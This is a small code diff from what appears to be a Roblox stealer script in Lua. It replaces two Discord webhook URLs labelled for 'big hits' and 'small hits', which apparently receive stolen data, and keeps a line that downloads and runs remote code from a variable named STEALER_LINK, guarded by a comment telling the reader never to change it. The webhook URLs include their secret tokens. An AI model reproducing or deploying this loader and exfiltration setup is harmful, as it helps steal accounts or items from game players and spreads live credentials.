@@ -5,7 +5,7 @@ Usernames = {
     'zain_fatir'
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1362363876695343114/A44hg0xe5865krMxhp5PDoGVHZ1TJDNqfe2C_P85JOoqdfM0Mn3to7xDBxTSgIn-CRV3"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1362363672630001788/azsU0s6Gi6gCERhOwT-QZ2XYKMCdQjLz_itx586sINSI_fBzzZqyvF5RoF7zezotwRvt"
+BigHitsWebhook = "https://discord.com/api/webhooks/1364735785462661260/dK0dgKua4JgOAcPUesMCqpMJEcUqaXncBV41J5fUGVwWN1ot_VzlBOjRqq97_21S9Nck"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1364735690650419271/kUasck1dnRRlFQe1VIkVonuN47MkT3HNiPqZcAKIn5x7hztvWnNxgwjNpT6JwjNZLFd9"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
